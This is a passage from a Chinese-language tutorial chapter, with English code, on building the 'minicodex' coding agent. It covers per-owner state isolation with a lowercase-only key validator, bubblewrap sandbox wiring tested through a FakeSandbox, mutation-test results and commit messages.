    server hosts shares one, exactly as every project on one machine shares
    one in codex.

Every sentence there is true, and the conclusion is a data leak.  "Every
project on one machine" is one person's projects.  "Every workspace this
server hosts" is *everybody's*.  The port was faithful; the trust model moved
underneath it, and nothing in the type system noticed because there was never
a type for "who".

That is what this module adds, and all it adds.  `Owner` is a name plus the
paths that belong to it.  The default owner resolves to exactly the paths
chapters 16 and 17 already use, byte for byte, so the CLI is unchanged and
every test written before this chapter still describes the program it was
written for.

**Scope, stated because its absence would look like an oversight**: this is
the *seam*, not a multi-user system.  There is no registration here, no
session, no password, no quota, and `Owner.key` is trusted completely by
whoever constructs it.  A server that derives an owner from an unauthenticated
request header has moved the leak, not closed it.  Authentication and quotas
are chapter 23; this chapter's job is to make sure that when they arrive there
is somewhere to put them.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from pathlib import Path

from minicodex.memory import MINICODEX_HOME

# What a key may contain.  Deliberately far narrower than "a valid filename":
# this string becomes a path segment, and the whole value of the seam is lost
# if `..` or an absolute path can travel through it.  Chapter 18 learned this
# on a skill name that arrived from the model (F18-04, F18-12) and closed it
# by looking the name up in an already-parsed table rather than rebuilding a
# path from it.  Here there is no table to look up in -- an owner key is
# genuinely new data -- so the check is on the characters themselves.
#
# Lower case only, and that half is a *containment* rule rather than a taste
# in names.  Two owners are separated by nothing except the spelling of one
# path segment, and on a case-insensitive filesystem two spellings are one
# directory.  Measured on this machine (NTFS): `mkdir alice` then
# `mkdir Alice` does not make a second directory, it raises `IOException` and
# leaves `alice` -- so `Owner("Alice")` and `Owner("alice")` would read and
# write each other's memories, on Windows and on a default macOS volume,
# while staying correctly separate on Linux.  A leak that appears only on
# some filesystems is the worst shape this chapter has to offer: it would
# pass every test on the machine the server does not run on.
#
# Anyone widening this pattern later has to keep that property.  Allowing
# upper case reopens the leak; the fix would be to case-fold the key before
# it ever becomes a path, not to trust the filesystem to keep them apart.
_SAFE_KEY = re.compile(r"\A[a-z0-9][a-z0-9_-]{0,63}\Z")

# Where per-owner state lives when there is more than one owner.  A single
# extra directory level, not a parallel tree: `~/.minicodex/tenants/<key>/`
# holds exactly what `~/.minicodex/` holds for the single-tenant case, so the
# two layouts differ by a prefix and nothing else.  Anything that reads one
# can read the other.
TENANTS_DIR = "tenants"


class OwnerError(ValueError):
    """An owner key this module refuses to turn into a path."""


@dataclass(frozen=True)
class Owner:
    """One tenant, and where its state lives.

    `key=None` is the single-tenant case and is the default everywhere, which
    is what keeps this chapter backward compatible: `Owner().memories()` is
    `~/.minicodex/memories`, the exact path `memory.DEFAULT_MEMORY_DIR` names.

    Frozen, and the paths are methods rather than fields, because an `Owner`
    is an identity and not a bag of directories -- two `Owner("alice")` values
    built in different modules must be equal and must resolve identically.
    """

    key: str | None = None
    home: Path = MINICODEX_HOME

    def __post_init__(self) -> None:
        if self.key is None:
            return
        if not _SAFE_KEY.match(self.key):
            raise OwnerError(
                f"owner key {self.key!r} is not usable as a directory name: "
                "use 1-64 characters of a-z, 0-9, hyphen or underscore, "
                "starting with a letter or digit"
            )

    def root(self) -> Path:
        """The directory every other path in this class hangs off."""
        if self.key is None:
            return self.home
        return self.home / TENANTS_DIR / self.key

    # -- the three things that were global -----------------------------------

    def memories(self) -> Path:
        """Chapter 16's read path, and chapter 17's write target."""
        return self.root() / "memories"

    def jobs_db(self) -> Path:
        """Chapter 17's claim/lease table.

        Per owner for the same reason the memory directory is: the table
        records which sessions have already been turned into memory, and one
        table shared by two people would let one person's extraction mark
        another person's session as done.
        """
        return self.root() / "memory_jobs.sqlite3"

    def merge_lock(self) -> Path:
        """Chapter 17's single-writer lock.

        The sharpest of the four.  One lock for the whole machine is correct
        when there is one memory directory: it is what stops two sessions
        merging into the same files at once.  With one lock and *many* memory
        directories it stops being a correctness device and becomes a queue --
        owner A's merge blocks owner B's, for no reason except that they share
        a server.
        """
        return self.root() / "memory_merge.lock"

    def describe(self) -> str:
        who = "single-tenant" if self.key is None else f"owner {self.key!r}"
        return f"{who} at {self.root()}"


#: The owner the CLI runs as.  A module-level value rather than a default
#: argument so that `is DEFAULT_OWNER` is a meaningful question -- "did this
#: caller think about tenancy, or inherit it".
DEFAULT_OWNER = Owner()


__all__ = [
    "DEFAULT_OWNER",
    "TENANTS_DIR",
    "Owner",
    "OwnerError",
]
```

> - **说明**：上面 §9 开头讲的那个故事，原样写在代码旁边。最后一段说"这是缝，不是多用户系统"——改写时把里面的"chapter 22"改成了 23（认证和配额在第 23 章）。
> - **`_SAFE_KEY`**：key 能用的字符。注释的后半段是 §9.3 的内容。
> - **`TENANTS_DIR`**：多用户时，每个人的东西放在 `~/.minicodex/tenants/<key>/` 下面，和单用户的布局只差一个前缀。
> - **`OwnerError`**：key 不合格时抛的异常。
> - **`Owner`**：`key` 和 `home` 两个字段；`__post_init__` 在造对象时检查 key；`root()` 是这个人所有东西的根目录；三个方法给出记忆目录、任务表、合并锁的位置；`describe()` 给人看。分组注释原来写着"四样全局的东西"，这一章只有三样（第 21 章才加了第四样），改写时改了。
> - **`DEFAULT_OWNER`**：命令行用的那个"没有 key 的人"。


`key=None` 是单租户，是所有地方的默认值，而且**它必须精确等于第 16、17 章
已经在用的路径**。这不是希望，是断言：


```python
def test_F20_08_the_default_owner_is_todays_paths(tmp_path: Path) -> None:
    """The whole backward-compatibility claim, as one assertion. Chapters 16
    and 17 name these paths directly; if this drifts, every test written
    before chapter 20 is describing a different program."""
    from minicodex.memory import DEFAULT_MEMORY_DIR
    from minicodex.memory_jobs import DEFAULT_JOBS_PATH
    from minicodex.memory_write import MERGE_LOCK

    assert DEFAULT_OWNER.memories() == DEFAULT_MEMORY_DIR
    assert DEFAULT_OWNER.jobs_db() == DEFAULT_JOBS_PATH
    assert DEFAULT_OWNER.merge_lock() == MERGE_LOCK


def test_F20_08_two_owners_do_not_share_a_memory_directory() -> None:
    """The fault, stated as the thing that was true before it was fixed.

    `web/runtime.py` documented one shared global memory directory as correct
    -- "every workspace this server hosts shares one, exactly as every project
    on one machine shares one in codex". Every clause is true and the
    conclusion leaks: one machine's projects are one person's, one server's
    workspaces are everybody's.
    """
    alice, bob = Owner("alice"), Owner("bob")
    assert alice.memories() != bob.memories()
    assert alice.jobs_db() != bob.jobs_db()
    assert alice.merge_lock() != bob.merge_lock()


def test_F20_08_an_owner_is_its_key(tmp_path: Path) -> None:
    """Two `Owner("alice")` built in different modules must be the same tenant."""
    assert Owner("alice", home=tmp_path) == Owner("alice", home=tmp_path)
    assert Owner("alice", home=tmp_path).memories() == Owner("alice", home=tmp_path).memories()


def test_F20_09_the_merge_lock_is_per_owner() -> None:
    """One lock for the whole machine is correct with one memory directory and
    becomes a queue with many: owner A's merge blocking owner B's, for no
    reason except a shared server."""
    assert Owner("alice").merge_lock() != Owner("bob").merge_lock()
    assert DEFAULT_OWNER.merge_lock() not in (Owner("alice").merge_lock(),)
```

三个之中 `merge_lock` 最值得说。**一把全局锁，在只有一个记忆目录的时候是
正确的**——它正是防止两个会话同时合并同一批文件的东西。有了多个记忆目录之后，
它不再是一个正确性装置，**变成了一个队列**：A 的合并阻塞 B 的，
原因仅仅是他们共用一台服务器。

### 9.2 key 会变成路径段

```python
_SAFE_KEY = re.compile(r"\A[a-z0-9][a-z0-9_-]{0,63}\Z")
```

第 18 章已经为"一个从模型来的名字被拼成路径"付过学费了（F18-04、F18-12），
那次的修法是**在已解析的表里查名字，而不是重新拼路径**。这里没有表可查——
owner key 是真正的新数据——所以检查落在字符上。测试直接喂 `../escape`、
`/absolute`、`.hidden`。

```python
@pytest.mark.parametrize(
    "key",
    ["../escape", "/absolute", "with space", "", "a" * 65, ".hidden", "trailing/"],
)
def test_F20_08_a_key_that_could_leave_its_directory_is_refused(key: str) -> None:
    """The key becomes a path segment, and chapter 18 already paid for a name
    that arrived as data and was turned into a path (F18-04, F18-12). There it
    was closed by looking the name up in a parsed table; an owner key is
    genuinely new data, so the check is on the characters."""
    with pytest.raises(OwnerError):
        Owner(key)


@pytest.mark.parametrize("key", ["alice", "a", "team-1", "user_2", "0abc"])
def test_F20_08_ordinary_keys_are_accepted(key: str) -> None:
    assert Owner(key).root().name == key


def test_F20_08_a_tenant_layout_differs_from_the_default_by_a_prefix(tmp_path: Path) -> None:
    """One extra directory level, not a parallel tree: anything that can read
    one layout can read the other."""
    single = Owner(home=tmp_path)
    tenant = Owner("alice", home=tmp_path)
    assert tenant.memories().relative_to(tenant.root()) == single.memories().relative_to(
        single.root()
    )
```


### 9.3 那个"只允许小写"是一条隔离边界，而我没把它写成边界

这一条是这一章写完之后、review 时才发现的，而且它**不是行为错了，是记录的理由错了**。

上面那个正则只收小写。`UPPER` 当时和 `../escape`、`/absolute` 并排躺在同一张
测试表里，而那张表的名字叫 *"a key that could leave its directory"*。

但 `Alice` 跑不出任何目录。它是一个完全正常的目录名。它被拒绝是因为另一件事——
在**大小写不敏感的文件系统上，两个拼法不是两个目录**。在这台机器（NTFS）上实测：

```
mkdir alice   ->  ok
mkdir Alice   ->  IOException
ls            ->  alice
```

也就是说 `Owner("Alice")` 和 `Owner("alice")` 会共用记忆、共用任务库、共用同一把
合并锁——**在 Windows 上，在默认的 macOS 卷上，而在 Linux 上完全正常分开**。

这是这一章能造出来的最难看的一种泄漏：**它只在服务器不运行的那些文件系统上出现。**
在 Linux CI 上你永远测不出来，在开发机上你永远不会去测。

行为本来就是对的——那个正则一直只收小写。危险的是那句写错的理由：
将来有人为了支持 `Alice` 这样的用户名去放宽正则，会看到一条红测试说
"这个 key 可能跑出它的目录"，然后合理地想"`Alice` 又跑不出去，这测试太严了"，
于是把它放宽掉。**错误的理由，正是那个邀请你重开漏洞的东西。**

修法三件事：理由写在正则定义处、单独一条名字自己会解释的测试
（`..._because_two_spellings_can_be_one_directory`），以及第 26 条变异——
把正则放宽成 `[A-Za-z0-9]`，看有没有东西会红。有，5 个。

```python
@pytest.mark.parametrize("key", ["Alice", "UPPER", "MiXeD"])
def test_F20_08_an_upper_case_key_is_refused_because_two_spellings_can_be_one_directory(
    key: str,
) -> None:
    """Split out from the traversal cases above, because the *reason* is
    different and the reason is the whole point.

    `Alice` cannot climb out of anything -- it is a perfectly ordinary
    directory name. It is refused because on a case-insensitive filesystem it
    is not a *second* directory: measured on NTFS, `mkdir alice` then
    `mkdir Alice` raises rather than creating one, leaving a single `alice`.
    So `Owner("Alice")` and `Owner("alice")` would share memories, jobs and a
    merge lock on Windows and on a default macOS volume, while staying
    correctly apart on Linux -- a leak that passes every test on any machine
    the server does not run on.

    Kept as its own test with its own name so that whoever sees it go red
    after widening `_SAFE_KEY` reads why it exists. Folded into the traversal
    list, the message would have been "could leave its directory", which is
    not true of `Alice` and invites exactly the relaxation that reopens this.
    """
    with pytest.raises(OwnerError):
        Owner(key)
```


### 9.4 这一章到此为止，下一章接着走

必须说清楚，否则会看起来像没做完：

**这是缝，不是多用户系统。** 这里没有注册、没有会话、没有密码、没有配额，
而且 `Owner.key` 被构造它的人**完全信任**。一个从未认证的请求头里取出
owner 的服务器，只是把泄漏挪了个地方，没有堵上。

认证和配额是第 23 章。这一章的任务是保证它们到的时候，**有地方放**。


---

## §10 怎么测一个由内核强制的东西

这是本章的方法论部分，也是它和前十九章最不一样的地方。

**大部分测试断言 argv。** `wrap()` 是一个纯函数：spec 进去，命令行出来。
所以"`read-only` 会不会绑上可写路径"是一个关于字符串列表的问题，
不需要内核。这些测试在 Windows 上跑，在 macOS 上跑，在 CI 上跑。

**少数测试断言内核**，用 `needs_bwrap` 守着。守卫的 reason 写的是
**缺了什么东西**，不是平台：

```python
needs_bwrap = pytest.mark.skipif(
    shutil.which("bwrap") is None,
    reason="no bwrap on this machine -- see probe_sandbox.py, which measures the kernel",
)
```

```
SKIPPED [1] no bwrap on this machine -- see probe_sandbox.py, which measures the kernel
```

"skipped: not Linux" 是一句会让人停止追问的话——包括停止追问
**为什么 Linux 的 CI 机器也跳过了**。一个悄悄跳过的安全测试比没有测试更糟：
缺席的那个是已知的缺口，安静的那个是一个洞上面盖着的绿勾。

### 10.1 而这件事就在本章发生了


（第一版的数字，在那台没有 bwrap 的 Windows 机器上：）

`probe_mutations_ch20.py` 第一次跑，26 条变异里**活下来两条**：

```
    0 test(s) fail  <-  the sandbox is ignored, so a confined session is not one
    0 test(s) fail  <-  the wrapper's own failure reaches the model as a command result
```

两条都在 `shell.py`，也就是**接缝本身**。把 `shell.run` 里那行
`self.sandbox.wrap(...)` 删掉——一个自称被隔离、实际没有的会话——
**整个测试套件是绿的**。

原因很清楚：所有能抓住它的测试都需要真的 `bwrap`，而在这本书写作的这台机器上
它们全部被跳过了。

**这就是第 19 章的故障，隔了一章原样重演。** 第 19 章的 README 写着
"32 mutations, 0 survivors"，实际活着三条，而且活着的正是它自己在
"新增了什么"表格里吹的两个机制。

那次的教训是"一份通过的测试集和一句验证声明是两件事"。这次的教训更窄也更锋利：

> **接线不是机制。** bubblewrap 能不能隔离，是内核的问题；
> `shell.run` 有没有去调它，是两行 Python 的问题——
> 而回答第二个问题**不应该需要回答第一个**。

修法是一个 `FakeSandbox`：记录它被要求包装什么，然后返回一个
**在任何平台都能跑**的 argv（当前解释器 + 一段脚本）。


测试文件 `tests/test_faults_ch20.py` 的开头。说明讲的就是本节这件事：大部分测试只看命令行，少数要真的内核：

```python
"""Chapter 20: the OS boundary, and who owns the state behind it.

The tests here split in two, and the split is deliberate rather than a
compromise.

**Most of them assert on argv.** `BubblewrapSandbox.wrap` is a pure function
from a spec to a command line, so "does `read-only` refuse to bind anything
writable" is a question about a list of strings and needs no kernel. Those run
on Windows, on macOS, in CI, everywhere the other twenty chapters run.

**A few of them assert on a kernel**, and those are guarded by
`needs_bwrap`. The guard names the missing thing -- `bwrap` on PATH -- rather
than the platform, because "skipped: not Linux" is a sentence that stops
anybody asking why the Linux CI box skipped it too. A security test that
skips quietly is worse than a security test that does not exist: the absent
one is a known gap, the quiet one is a green tick over a hole.

What is *not* here: proof that bubblewrap isolates correctly. That is the
kernel's job and `probe_sandbox.py`'s measurement, not a unit test's claim.
"""

from __future__ import annotations

import shutil
import sys
from pathlib import Path

import pytest

from minicodex.policy import Decision, Risk, judge_command, policy_tables
from minicodex.sandbox import (
    BubblewrapSandbox,
    NoSandbox,
    SandboxSpec,
    for_mode,
    setup_failure,
)
from minicodex.shell import ShellSession
from minicodex.tenancy import DEFAULT_OWNER, Owner, OwnerError

needs_bwrap = pytest.mark.skipif(
    shutil.which("bwrap") is None,
    reason="no bwrap on this machine -- see probe_sandbox.py, which measures the kernel",
)
```

> `needs_bwrap`：一个现成的 `skipif` 标记，后面带 `@needs_bwrap` 的测试在没有 bwrap 的机器上跳过，并打印原因。

```python
class FakeSandbox:
    """A sandbox that records and substitutes, so the *seam* can be tested.

    This class exists because of a survivor.  The first run of
    `probe_mutations_ch20.py` deleted the two lines in `shell.py` that reach
    for the sandbox at all -- "the sandbox is ignored, so a confined session is
    not one" -- and **nothing failed**.  Every test that would have noticed
    needed a real `bwrap`, so on the machine this book is written on they were
    all skipped, and the mutation walked through a green suite.

    That is chapter 19's fault repeating itself one chapter later: its README
    claimed 0 survivors while three stood, and the three were its own headline
    mechanisms.  The lesson there was that a passing suite and a verification
    claim are different facts.  The lesson here is narrower and sharper: *the
    wiring is not the mechanism*.  Whether bubblewrap isolates is a question
    for a kernel; whether `shell.run` ever calls it is a question about two
    lines of Python, and answering the second one must not require the first.

    So this returns an argv that runs anywhere -- the current interpreter, with
    a script -- and records what it was asked to wrap.
    """

    def __init__(self, *, stdout: str = "wrapped", exit_code: int = 0) -> None:
        self.calls: list[tuple[str, str]] = []
        self._stdout = stdout
        self._exit = exit_code

    def wrap(self, command: str, *, cwd: str) -> list[str]:
        self.calls.append((command, cwd))
        script = f"import sys; sys.stdout.write({self._stdout!r}); sys.exit({self._exit})"
        return [sys.executable, "-c", script]

    def unavailable(self) -> str | None:
        return None


def test_a_shell_session_without_a_sandbox_is_unchanged(tmp_path: Path) -> None:
    assert ShellSession(cwd=str(tmp_path)).sandbox is None


async def test_the_shell_actually_reaches_for_its_sandbox(tmp_path: Path) -> None:
    """The wiring, on every platform.

    Deleting `shell.py`'s call to `sandbox.wrap` leaves a session that says it
    is confined and is not.  Nothing about that needs a kernel to detect.
    """
    fake = FakeSandbox()
    shell = ShellSession(cwd=str(tmp_path), sandbox=fake)
    out = await shell.run("echo hi")
    assert fake.calls == [("echo hi", str(tmp_path))]
    assert "wrapped" in out


async def test_a_wrapper_failure_does_not_reach_the_model_as_command_output(
    tmp_path: Path,
) -> None:
    """The other survivor.

    `shell.run` asks `setup_failure` whether exit 1 came from the wrapper or
    from the command.  With that branch deleted, a containment failure is
    handed to the model as ordinary output and read as its own mistake -- and
    the model retries it, which is F05-09's shape arriving through a new door.
    """
    fake = FakeSandbox(
        stdout="bwrap: Can't chdir to /nope/nothing: No such file or directory",
        exit_code=1,
    )
    shell = ShellSession(cwd=str(tmp_path), sandbox=fake)
    out = await shell.run("echo hi")
    assert "the sandbox could not be built" in out
    assert "Report it rather than retrying" in out


async def test_an_ordinary_failure_is_still_an_ordinary_failure(tmp_path: Path) -> None:
    """The other half, so the branch above cannot be satisfied by always
    claiming a wrapper failure."""
    fake = FakeSandbox(stdout="make: *** No targets specified.  Stop.", exit_code=1)
    shell = ShellSession(cwd=str(tmp_path), sandbox=fake)
    out = await shell.run("make")
    assert "the sandbox could not be built" not in out
    assert "exit code 1" in out
```

> - `FakeSandbox.wrap` 不管收到什么命令，都返回"用当前的 Python 解释器跑一小段脚本"的 argv——任何平台都能跑——同时把它被要求包装的命令记下来。
> - 第二个测试：`shell.run` 真的去调了沙箱（`calls` 里有这条命令），输出来自那段脚本而不是原命令。
> - 第三、四个：沙箱"失败"（输出 `bwrap: ...`、退出 1）时，模型拿到的是三段式错误；一次普通的失败仍然是普通的输出加退出码。

`shell.py` 里被测的那几处改动：

```python
from minicodex.sandbox import Sandbox, setup_failure
```

```python
def __init__(
    self,
    *,
    cwd: str | os.PathLike[str] | None = None,
    timeout: float = DEFAULT_TIMEOUT,
    sandbox: Sandbox | None = None,
) -> None:
```

```python
# `None`, not `NoSandbox()`, and the difference is the point.  `None`
# means "this caller predates chapter 20" -- every construction site in
# chapters 2 to 19, and every test written against them.  Those keep
# the `create_subprocess_shell` path below, unchanged, so adding a
# sandbox changes nothing for anyone who did not ask for one.  This is
# the convention chapter 16 set with `--memory` and chapter 18 with
# `--skills`: a new boundary ships off, and turning it on is an act.
self.sandbox = sandbox
```

```python
argv = self.sandbox.wrap(command, cwd=self.cwd) if self.sandbox is not None else None

if argv is None:
    # `asyncio.create_subprocess_shell`, not `subprocess.Popen`: the
    # latter is a blocking call, and `ruff`'s ASYNC220 rejects making one
    # inside `async def` for the same reason chapter 1's `read_file`
    # runs `Path.read_text()` in a thread -- a blocking call in an async
    # function stalls the entire event loop, not just this call.
    proc = await asyncio.create_subprocess_shell(
        command,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
        stdin=asyncio.subprocess.DEVNULL,
        start_new_session=True,
        cwd=self.cwd,
        env=self.env,
    )
else:
    # `_exec`, not `_shell`, and `cwd=` is gone: the shell that
    # interprets the command now lives *inside* the namespace
    # (`/bin/sh -c` is the tail of `argv`), and the working directory
    # is `--chdir` because it has to be resolved in there too.  Passing
    # `cwd=self.cwd` here as well would resolve it on the host, before
    # the namespace exists, and that is a different directory.
    proc = await asyncio.create_subprocess_exec(
        *argv,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
        stdin=asyncio.subprocess.DEVNULL,
        start_new_session=True,
        env=self.env,
    )
```

> - `sandbox=None` 是默认值：第 2–19 章的每一处构造、每一个测试，走的都是原来那条 `create_subprocess_shell` 的路，一行不变。
> - 有沙箱时换成 `create_subprocess_exec(*argv)`，而且**不再传 `cwd=`**：工作目录由 `--chdir` 在命名空间里面决定，在宿主机上再传一次，解析出来的是另一个目录。

### 10.2 改写时发现：一个只在"没有 bwrap 的机器"上才有意义的测试

§10.1 说的是一种测试：需要 bwrap，于是在没有 bwrap 的机器上被跳过，变异从绿的测试集中间走过去。这次改写在一台**有** bwrap 的机器上跑变异检查，碰到了它的反面：

```
    0 test(s) fail  <-  for_mode falls back to no sandbox when bubblewrap is missing

1 mutation(s) nothing noticed:
  - for_mode falls back to no sandbox when bubblewrap is missing
```

这条变异在 `for_mode` 开头加了两行："找不到 bwrap 就返回 `NoSandbox()`"——也就是 F20-02 整条故障要防的那个"悄悄退回、名字还在、意义没了"。守着它的测试是这样的：

```python
    sandbox = for_mode("read-only", tmp_path)
    assert isinstance(sandbox, BubblewrapSandbox)
```

它**依赖机器上没有 bwrap**：在第一版写作的那台 Windows 上，`shutil.which("bwrap")` 是 `None`，变异会退回 `NoSandbox`，测试变红。在一台装了 bwrap 的机器上——包括 `postmerge.yml` 注释里说的那个 CI 机器——`which` 找得到，那两行永远不会执行，测试永远是绿的。

§10 开头那段话说："一个悄悄跳过的安全测试比没有测试更糟。"这一个没有跳过，它**跑了，并且在测一件在这台机器上不可能发生的事**。形状一样：测试的意义取决于它跑在哪台机器上，而它自己不说。

修法：别依赖机器，让测试自己把 bwrap 变没——`monkeypatch` 把 `minicodex.sandbox` 看到的 `shutil.which` 换成一个永远返回 `None` 的函数：

```python
def test_F20_02_a_missing_binary_is_reported_before_anything_runs(tmp_path: Path) -> None:
    """`unavailable()` exists so the check happens at startup, not at the
    first command -- by then the user has been told the session is confined."""
    sandbox = BubblewrapSandbox(
        SandboxSpec.for_mode("read-only", tmp_path), binary="definitely-not"
    )
    why = sandbox.unavailable()
    assert why is not None
    assert "definitely-not" in why
    assert "full-access" in why  # names the way out, not just the problem


def test_F20_02_for_mode_does_not_silently_fall_back(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The fault this whole fault-id is about.

    A factory that returned `NoSandbox()` when bubblewrap is missing would be
    the tidy version and the dangerous one: `read-only` would keep its name
    and lose its meaning. `for_mode` always returns the real thing and lets
    `unavailable()` speak.

    bubblewrap is made missing here rather than assumed missing. The first
    version relied on the machine: it was written where there is no `bwrap`,
    so the fallback it guards against would have triggered there -- and on a
    machine that has `bwrap` the fallback never triggers and the test passed
    with it in place. Found when chapter 20 was rewritten, on such a machine.
    """
    monkeypatch.setattr("minicodex.sandbox.shutil.which", lambda _name: None)
    sandbox = for_mode("read-only", tmp_path)
    assert isinstance(sandbox, BubblewrapSandbox)
    assert sandbox.unavailable() is not None


def test_F20_02_no_sandbox_says_so_when_asked(tmp_path: Path) -> None:
    assert NoSandbox().wrap("echo hi", cwd=str(tmp_path)) is None
    assert NoSandbox().unavailable() is not None
```

> - `monkeypatch.setattr("minicodex.sandbox.shutil.which", ...)`：用字符串指定"哪个模块里的哪个名字"。换的是 `sandbox.py` 里 `shutil.which` 这个引用，测试结束自动换回来。
> - 多加的一句 `assert sandbox.unavailable() is not None`：退回之后，`unavailable()` 必须说话。

修完那条变异被抓住了（§12）。

`for_mode` 本身：

```python
def for_mode(
    mode: SandboxMode,
    root: Path,
    *,
    read_roots: tuple[Path, ...] = (),
    network: bool | None = None,
) -> Sandbox:
    """The sandbox a mode asks for, on this machine.

    Deliberately *not* a fallback chain.  If bubblewrap is missing this still
    returns a `BubblewrapSandbox`, whose `unavailable()` then says so; the
    caller decides whether that is fatal.  Choosing `NoSandbox` here instead
    would be the failure mode F20-02 exists to prevent -- a `read-only`
    session that quietly is not.
    """
    spec = SandboxSpec.for_mode(mode, root, read_roots=read_roots)
    if network is not None:
        spec = SandboxSpec(
            mode=spec.mode, root=spec.root, read_roots=spec.read_roots, network=network
        )
    return BubblewrapSandbox(spec)
```

> 说明讲了它为什么**不是**一条退路链：bwrap 不在，也返回 `BubblewrapSandbox`，让它的 `unavailable()` 去说，由调用者决定这是不是致命的。

文件最后是 `__all__`：

```python
__all__ = [
    "BWRAP",
    "BubblewrapSandbox",
    "NoSandbox",
    "Sandbox",
    "SandboxSpec",
    "for_mode",
    "setup_failure",
]
```

### 10.3 再说一遍：接线不是机制

§10.1 那句话——"接线不是机制……`shell.run` 有没有去调它，是两行 Python 的问题"——在这一章里还有一个更大的版本，§0.4 已经说过：**`shell.run` 会去调沙箱，可整个程序里没有人给它一个沙箱。** `FakeSandbox` 证明了 `ShellSession` 和沙箱之间的那根线是通的；`ShellSession` 和 `minicodex ask` 之间的那根线，这一章没有接。

测试在这件事上帮不了你：每个测试都是自己造一个 `ShellSession(sandbox=...)`，然后检查它。没有一个测试从命令行一路走到 `run_shell`、再看命令是不是在沙箱里。

---

## §11 清点：这一章写了多少代码

| 文件 | 行数 | 代码在哪一节 |
|---|---|---|
| `src/minicodex/sandbox.py` | 361（新） | 全文都在正文里：§3.1、§3.2、§4.1、§5、§6.1、§10.2 |
| `src/minicodex/tenancy.py` | 161（新） | §9（全文） |
| `src/minicodex/shell.py` | +64 | §5、§10.1 |
| `src/minicodex/policy.py` | +58 | §8 |
| `tests/test_approval.py` | +16 | §8 |
| `tests/test_faults_ch20.py` | 572（新），50 个测试 | 每一个都在正文里 |
| `probe_sandbox.py` | 319（新），六段 | 只贴了输出，和改写时改过的网络那两段（§4.3） |
| `probe_mutations_ch20.py` | 292（新），26 条变异 | §12 |

`shell.py` 只改了两处，`policy.py` 只加了一个分支——这是刻意的。沙箱是**加在接缝上**的，不是重写执行路径。前十九章写下的测试一个都没改。

---

## §12 验证

```
$ uv run ruff format --check . && uv run ruff check .
115 files already formatted
All checks passed!

$ uv run python scripts/check_layers.py --quiet && echo ok
ok

$ uv run pytest
1930 passed, 34 warnings in 89.90s (0:01:29)

$ uv run python probe_mutations_ch20.py
26 mutations, tests/test_faults_ch20.py tests/test_approval.py tests/test_shell.py

    3 test(s) fail  <-  the network switch stops doing anything
    4 test(s) fail  <-  everything is bound writable, so read-only is a name and nothing else
    4 test(s) fail  <-  workspace-write loses its writable hole
    1 test(s) fail  <-  the pid namespace goes away, so a timeout leaves the payload's children
    2 test(s) fail  <-  read-only gains a writable workspace
    1 test(s) fail  <-  full-access is wrapped after all, so ps lies about what is enforced
    2 test(s) fail  <-  network follows the mode everywhere, collapsing four combinations to two
    4 test(s) fail  <-  extra read roots are dropped, so the shell cannot see chapter 16's memory
    3 test(s) fail  <-  a read root uses --ro-bind, so an absent one stops the whole session
    1 test(s) fail  <-  read roots are bound before the writable holes, so a hole re-opens them
    3 test(s) fail  <-  a bwrap setup failure is reported to the model as ordinary command output
    1 test(s) fail  <-  every exit code is examined, so a command exiting 42 can be called a wrapper failure
    2 test(s) fail  <-  a missing bwrap is reported as fine
    1 test(s) fail  <-  for_mode falls back to no sandbox when bubblewrap is missing
    3 test(s) fail  <-  the sandbox is ignored, so a confined session is not one
    1 test(s) fail  <-  the wrapper's own failure reaches the model as a command result
    3 test(s) fail  <-  the shell is dropped from the argv, so pipes and && stop meaning anything
    1 test(s) fail  <-  confinement is ignored, so the sandbox buys no fewer prompts
   12 test(s) fail  <-  confinement is on by default, quietly silencing prompts nobody disabled
    3 test(s) fail  <-  a confined session may reach the network without being asked
    7 test(s) fail  <-  every owner shares one directory again -- the leak this chapter closes
   10 test(s) fail  <-  an owner key is not checked, so it can climb out of its directory
    3 test(s) fail  <-  the key pattern is widened to allow upper case, so two spellings become one directory on a case-insensitive filesystem
    2 test(s) fail  <-  the merge lock is global again, so one owner's merge blocks another's
    1 test(s) fail  <-  the jobs table is shared, so one owner marks another's session extracted
    2 test(s) fail  <-  full-access without the network can write nowhere, not even its workspace

every mutation was caught.
```

（这次在一台装了 bwrap 的 Linux 机器上跑：四个 `needs_bwrap` 的测试都真的执行了，没有一个跳过。）

26 条变异，全部被抓住。和第一版比：删了一条（变异的是 §5.1 删掉的那个没人用的方法），加了一条（§4.2）；还有一条——"`for_mode` 悄悄退回"——在这台机器上第一次跑时是活的，补了测试才被抓住（§10.2）。

### 12.1 一个 CI 检查抓到的遗漏

写完变异脚本，`test_packaging.py::test_F_1_05_every_mutation_script_runs_somewhere` 红了。

这个测试是第 12 章加的，因为当时发现第 11 章的十九条变异**从来没有被接进 CI**：
章节正文说它们"和第 9 章一样在 postmerge 里跑"，脚本是对的，
workflow 里只有 9 和 10 的步骤，而仓库里每一个测试都是绿的。

它抓到的规则是：**写在散文里的承诺不是一个机制。**

这次它又抓到了一次，抓的是我。补上 workflow 步骤之后变绿。

---

## §13 收工：commit、PR

```
feat(sandbox): build a bwrap command line from a sandbox mode
feat(shell): run commands inside the sandbox when one is configured
feat(policy): let a confined session write without asking
feat(tenancy): give per-owner state a type
test(ch20): 46 tests, 44 of them offline on any platform
test(ch20): close the two mutation survivors in the shell seam
ci: run chapter 20's mutation check in postmerge
docs(ch20): the chapter, the step README, the fault list
```

改写时又加了一个：

```
fix(steps): full-access without the network can write; the sandbox docs say
what read_roots does; probes and tests stop depending on the machine

Rewriting chapter 20 on a Linux machine with bubblewrap installed, so every
test and probe section really ran:

- full-access with network=False was wrapped with --ro-bind / / and no
  writable hole, so it could write nowhere -- not even its workspace.
  writable() now returns / for full-access.
- F20-07 was described backwards. Under --ro-bind / / the shell reads
  everything the host user can, read_roots or not; a read root only keeps a
  directory inside a writable workspace read-only. Docstrings say so.
- test_F20_02_for_mode_does_not_silently_fall_back passed with the fallback
  in place on any machine that has bwrap; it now makes bwrap missing itself.
- probe_sandbox.py's network rows had no control: on a machine that cannot
  reach example.com every row read "blocked". PROBE_URL, a control row, and
  labels computed from the exit code.
- chdir_is_reachable had no caller; its docstring and test said it ran
  before every command. Removed.
- tenancy.py: authentication is chapter 23, and there are three paths here.

Same changes in steps 21-23 and minicodex-live.
```

### PR 描述

